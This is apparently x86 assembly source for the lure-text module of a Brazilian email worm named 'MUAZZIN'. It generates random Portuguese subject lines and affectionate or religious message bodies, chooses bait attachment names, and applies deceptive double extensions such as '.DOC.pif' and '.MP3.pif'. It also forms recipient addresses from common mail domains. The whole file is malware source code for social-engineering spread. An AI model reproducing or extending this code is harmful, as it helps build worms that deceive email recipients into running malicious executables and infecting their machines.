
   ;  MUAZZIN GERADOR DE TEXTOS:
   ;  SEICHO-NO-IE

   TYPE    EQU "text"
   VERSION EQU 0101h

   include _param.INC

   mtext_entry:

   mov ebp, [esp+4]
   mov eax, [ebp+m_why]
   test eax, MT_GENTEXT
   jnz gen_da_text
   test eax, MT_QUERY
   jz exit
   mov esi, MT_QUERY+MT_GENTEXT
   mov ebx, TYPE
   mov ecx, VERSION
   mov eax, MR_DONE
   ret 4

   exit:

   mov dword [ebp+m_result], MR_OK
   ret 4

   gen_da_text:

   call .kernel
   db "KERNEL32.DLL", 0
  .kernel:

   call dword [ebp+GMH]
   call .api
   dd "GetTickCount", 0
  .api:
   push eax
   call dword [ebp+GPA]
   mov ebx, eax

   mov edi, [ebp+m_buffer]                  ;make name.exe
   add edi, 62*1024
   call rnd

;   API GetUserDefaultLCID
;   sub al, 16h
;   jz country_brazuca

;   push offset buffer
;   call rotina

   do_attachment:

   mov eax, [esp+4]
   push NULL
   push NULL
   push NULL
   push offset tbl_msg_extens000 ;24
   push 7 ;20
   push offset tbl_msg_rename000 ;16
   push 31 ;12
   push eax   ;   8  buffer
   call join_param ;4
   ret (4*1)

   do_subject:

   mov eax, [esp+4]
   push NULL
   push NULL
   push NULL
   push NULL
   push NULL
   push offset tbl_msg_subject00
   push 7
   push eax
   call join_param
   ret (4*1)

   do_mail:

   mov eax, [esp+4]
   push NULL
   push NULL
   push NULL
   push offset tbl_msg_emailx000 ;24
   push 7 ;20
   push offset tbl_msg_rename000 ;16
   push 31 ;12
   push eax   ;   8  buffer
   call join_param ;4
   ret (4*1)

   do_msgs:

   mov eax, [esp+4]
   push NULL
   push offset tbl_msg_seicho000
   push 31
   push offset tbl_msg_joiner000
   push 7
   push offset tbl_msg_seicho000
   push 31
   push eax
   call join_param
   ret (4*1)

   join_param:

   push ebp
   mov ebp, esp
   pushad
   add ebp, 4
   mov edi, [ebp+4]

   jp0:

   call rnd
   and eax, [ebp+8]
   cmp dword [ebp+8], 0
   jz jp2
   push eax
   pop ecx
   mov eax, [ebp+12] ; table
   test eax, eax
   jz jp2

   mov esi, [eax+ecx*4]
   push esi
   call _lstrlen

   push eax
   pop ecx
   rep movsb
   add ebp, 8
   jmp jp0

   jp2:

   sub al, al
   stosb
   popad
   pop ebp
   ret (4*8)

   ;   subject
   ;   escolhido randomicamente

   msg_subject00 db 'Queria estar ao seu lado...',0
   msg_subject01 db 'Pensando hoje em voce :)',0
   msg_subject02 db 'Namoro ou amizade ?',0
   msg_subject03 db 'Tornando sua vida mais feliz',0
   msg_subject04 db 'Apesar de tudo eu ainda me lembro de voce',0
   msg_subject05 db 'Voce esqueceu de mim ? :(',0
   msg_subject06 db 'Continuo te amando...',0
   msg_subject07 db 'Vamos nos alegrar ???',0

   tbl_msg_subject00 label

   dd offset msg_subject00
   dd offset msg_subject01
   dd offset msg_subject02
   dd offset msg_subject03
   dd offset msg_subject04
   dd offset msg_subject05
   dd offset msg_subject06
   dd offset msg_subject07

   ;   inicio da mensagem
   ;   escolhido randomicamente

   msg_padrao000 db 'Voce recebeu um cartao virtual',13,10,0
   msg_padrao001 db 'Caro amigo:',13,10,0
   msg_padrao002 db 'Perolas da vida:',13,10,0
   msg_padrao003 db 'Em rumo da felicidade:',13,10,0
   msg_padrao004 db 'Mensagens de conforto:',13,10,0
   msg_padrao005 db 'Expressando meus sentimentos:',13,10,0
   msg_padrao006 db 'Carinho e confianca:',13,10,0
   msg_padrao007 db 'O amor e a amizade:',13,10,0

   tbl_msg_padrao000 label

   dd offset msg_padrao000
   dd offset msg_padrao001
   dd offset msg_padrao002
   dd offset msg_padrao003
   dd offset msg_padrao004
   dd offset msg_padrao005
   dd offset msg_padrao006
   dd offset msg_padrao007

   ;   frases do meio
   ;   escolhidas aleatoriamente, formando textos

   msg_seicho000 db 'Se voce pensar em mim, nao pense em me procurar; me procure sem pensar',0
   msg_seicho001 db 'Alegre esperança atrai destino feliz',0
   msg_seicho002 db 'Cada momento de sua vida e um ponto de partida',0
   msg_seicho003 db 'Quando se deparar com um problema dificil, volva sua mente a Deus',0
   msg_seicho004 db 'Quem trabalha em prol dos semelhantes tem o Poder de atrair as pessoas',0
   msg_seicho005 db 'O que ha de mais bonito em voce e o seu sorriso',0
   msg_seicho006 db 'Quem trabalha com alegria torna-se saudavel',0
   msg_seicho007 db 'Todas as experiencias sao esmeris que dao polimento a sua alma',0
   msg_seicho008 db 'Quem abencoa os outros sera abencoado',0
   msg_seicho009 db 'A semente plantada nao germina imediatamente. A germinacao requer algum tempo',0
   msg_seicho010 db 'A dedicacao sincera toca o coracao de todas as pessoas',0
   msg_seicho011 db 'No final, vencem os que oram em vez de temer, e agem em vez de lamentar',0
   msg_seicho012 db 'A verdadeira riqueza esta na mente disposta a doar. Quem so quer receber acaba perdendo a riqueza',0
   msg_seicho013 db 'Reconhecer, amar e elogiar devem estar sempre presentes',0
   msg_seicho014 db 'O amor é uma virtude imutavel, eterna',0
   msg_seicho015 db 'Dificuldade, queda ou fracasso sao oportunidades para progredir',0
   msg_seicho016 db 'Status, fama, bens materiais sao ilusoes. Nao persiga as ilusoes',0
   msg_seicho017 db 'Abandonando o espirito de dependencia, passa a fluir a infinita forca vital',0
   msg_seicho018 db 'Marido e mulher sao dua metades da mesma alma que se conheceram e casaram',0
   msg_seicho019 db 'Na vida, nao se pode regatear. Cada um recebe o que condiz com a sua mente',0
   msg_seicho020 db 'Somos todos semeadores. Plantemos sempre sementes do bem',0
   msg_seicho021 db 'Deus se manifesta a nos quando nossa mente se liberta do apego',0
   msg_seicho022 db 'Aquele que agradece aos antepassados prospera naturalmente',0
   msg_seicho023 db 'Exponha a Deus todas as suas aflicoes e angustias',0
   msg_seicho024 db 'Nao se apegue; Mas seja atento e cuidadoso',0
   msg_seicho025 db 'Flui a forca infinita nas pessoas que trabalham com gratidao',0
   msg_seicho026 db 'O reino de Deus existe aqui e agora, inclusive dentro de voce',0
   msg_seicho027 db 'Agradeca a Deus pelo trabalho que lhe e atribuido agora',0
   msg_seicho028 db 'As pessoas constroem o seu destino com palavras',0
   msg_seicho029 db 'Todas as coisas do ceu e da terra sao seus amigos',0
   msg_seicho030 db 'O amor e uma grande forca curativa',0
   msg_seicho031 db 'Voce esta sempre cercado por um mar de gracas divinas',0
                 db 'E que assim se expresse meu ódio contra todos',0

   tbl_msg_seicho000 label

   dd offset msg_seicho000
   dd offset msg_seicho001
   dd offset msg_seicho002
   dd offset msg_seicho003
   dd offset msg_seicho004
   dd offset msg_seicho005
   dd offset msg_seicho006
   dd offset msg_seicho007
   dd offset msg_seicho008
   dd offset msg_seicho009
   dd offset msg_seicho010
   dd offset msg_seicho011
   dd offset msg_seicho012
   dd offset msg_seicho013
   dd offset msg_seicho014
   dd offset msg_seicho015
   dd offset msg_seicho016
   dd offset msg_seicho017
   dd offset msg_seicho018
   dd offset msg_seicho019
   dd offset msg_seicho020
   dd offset msg_seicho021
   dd offset msg_seicho022
   dd offset msg_seicho023
   dd offset msg_seicho024
   dd offset msg_seicho025
   dd offset msg_seicho026
   dd offset msg_seicho027
   dd offset msg_seicho028
   dd offset msg_seicho029
   dd offset msg_seicho030
   dd offset msg_seicho031

   ;   conector das mensagens
   ;   escolhidos aleatoriamente

   msg_joiner000 db ' entao ',0
   msg_joiner001 db ' pois ',0
   msg_joiner002 db ' voce sabia ? É verdade, ',0
   msg_joiner003 db ' , ',0
   msg_joiner004 db ' e sabendo disso, ',0
   msg_joiner005 db ' logo conclui-se que ',0
   msg_joiner006 db ' ,e é preciso acreditar no próximo, ',0
   msg_joiner007 db ' portanto ',0

   tbl_msg_joiner000 label

   dd offset msg_joiner000
   dd offset msg_joiner001
   dd offset msg_joiner002
   dd offset msg_joiner003
   dd offset msg_joiner004
   dd offset msg_joiner005
   dd offset msg_joiner006
   dd offset msg_joiner007

   ;   nomes para os arquivos
   ;   escolhidos aleatoriamente

   msg_rename000 db 'meus_amigos',0
   msg_rename001 db 'amizade',0
   msg_rename002 db 'amor',0
   msg_rename003 db 'felicidade',0
   msg_rename004 db 'esperanca',0
   msg_rename005 db 'namorados',0
   msg_rename006 db 'reflita',0
   msg_rename007 db 'pare_e_pense',0
   msg_rename008 db 'jesus_conosco',0
   msg_rename009 db 'destino',0
   msg_rename010 db 'almas_gemeas',0
   msg_rename011 db 'semente_do_bem',0
   msg_rename012 db 'forca_infinita',0
   msg_rename013 db 'espiritos',0
   msg_rename014 db 'gratidao',0
   msg_rename015 db 'atraia_a_deus',0
   msg_rename016 db 'amar',0
   msg_rename017 db 'elogiar',0
   msg_rename018 db 'reconhecer',0
   msg_rename019 db 'prospere_agora',0
   msg_rename020 db 'mar_divino',0
   msg_rename021 db 'virtudes',0
   msg_rename022 db 'padre_marcelo',0
   msg_rename023 db 'semeador',0
   msg_rename024 db 'liberdade',0
   msg_rename025 db 'vida_eterna',0
   msg_rename026 db 'germine_aos_poucos',0
   msg_rename027 db 'amigos',0
   msg_rename028 db 'energia',0
   msg_rename029 db 'cristais',0
   msg_rename030 db 'incenso',0
   msg_rename031 db 'saiba_amar',0

   tbl_msg_rename000 label

   dd offset msg_rename000
   dd offset msg_rename001
   dd offset msg_rename002
   dd offset msg_rename003
   dd offset msg_rename004
   dd offset msg_rename005
   dd offset msg_rename006
   dd offset msg_rename007
   dd offset msg_rename008
   dd offset msg_rename009
   dd offset msg_rename010
   dd offset msg_rename011
   dd offset msg_rename012
   dd offset msg_rename013
   dd offset msg_rename014
   dd offset msg_rename015
   dd offset msg_rename016
   dd offset msg_rename017
   dd offset msg_rename018
   dd offset msg_rename019
   dd offset msg_rename020
   dd offset msg_rename021
   dd offset msg_rename022
   dd offset msg_rename023
   dd offset msg_rename024
   dd offset msg_rename025
   dd offset msg_rename026
   dd offset msg_rename027
   dd offset msg_rename028
   dd offset msg_rename029
   dd offset msg_rename030
   dd offset msg_rename031


   ;   extensoes dos aplicativos

   msg_extens000 db '.exe',0
   msg_extens001 db '.scr',0
   msg_extens002 db '.pif',0
   msg_extens003 db '.DOC.pif',0
   msg_extens004 db '.TXT.pif',0
   msg_extens005 db '.HTM.pif',0
   msg_extens006 db '.BMP.pif',0
   msg_extens007 db '.MP3.pif',0

   tbl_msg_extens000 label

   dd offset msg_extens000
   dd offset msg_extens001
   dd offset msg_extens002
   dd offset msg_extens003
   dd offset msg_extens004
   dd offset msg_extens005
   dd offset msg_extens006
   dd offset msg_extens007

   msg_emailx000 db '@hotmail.com',13,10,0
   msg_emailx001 db '@globo.com',13,10,0
   msg_emailx002 db '@usa.net',13,10,0
   msg_emailx003 db '@zip.net',13,10,0
   msg_emailx004 db '@aol.com',13,10,0
   msg_emailx005 db '@tantofaz.net',13,10,0
   msg_emailx006 db '@uol.com.br',13,10,0
   msg_emailx007 db '@easymail.com',13,10,0

   tbl_msg_emailx000 label

   dd offset msg_emailx000
   dd offset msg_emailx001
   dd offset msg_emailx002
   dd offset msg_emailx003
   dd offset msg_emailx004
   dd offset msg_emailx005
   dd offset msg_emailx006
   dd offset msg_emailx007

   end mtext_entry
   end
